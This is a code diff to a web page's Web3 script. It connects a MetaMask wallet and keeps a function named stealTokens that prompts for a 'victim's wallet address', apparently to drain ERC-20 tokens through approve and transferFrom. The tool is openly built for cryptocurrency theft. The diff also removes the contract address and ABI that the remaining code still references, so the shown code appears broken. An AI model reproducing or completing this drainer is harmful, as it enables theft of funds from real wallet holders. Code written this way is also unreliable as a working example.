@@ -34,50 +34,22 @@
 </div>
 
 <script>
-    const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
-    const abi = [
-        {
-            "inputs": [
-                { "internalType": "address", "name": "spender", "type": "address" },
-                { "internalType": "uint256", "name": "amount", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
-            "name": "balanceOf",
-            "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-            "stateMutability": "view",
-            "type": "function"
-        },
-        {
-            "inputs": [
-                { "internalType": "address", "name": "sender", "type": "address" },
-                { "internalType": "address", "name": "recipient", "type": "address" },
-                { "internalType": "uint256", "name": "amount", "type": "uint256" }
-            ],
-            "name": "transferFrom",
-            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        }
-    ];
-
     let web3;
     let contract;
     let userAddress;
 
     async function connectWallet() {
         if (window.ethereum) {
-            web3 = new Web3(window.ethereum);
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = web3.eth.accounts[0];
-            contract = new web3.eth.Contract(abi, contractAddress);
-
-            document.getElementById('walletAddress').innerText = `Wallet Address: ${userAddress}`;
+            try {
+                web3 = new Web3(window.ethereum);
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = web3.eth.accounts[0];
+                contract = new web3.eth.Contract(abi, contractAddress);
+                document.getElementById('walletAddress').innerText = `Wallet Address: ${userAddress}`;
+            } catch (error) {
+                console.error(error);
+                document.getElementById('walletAddress').innerText = `Error connecting wallet.`;
+            }
         } else {
             alert('MetaMask not detected. Please install MetaMask.');
         }
@@ -94,7 +66,6 @@
     }
 
     async function stealTokens() {
-        // Replace '0xVictimAddress' with the actual victim address
         const victimAddress = prompt("Enter victim's wallet address:");
         if (!victimAddress) return;
 
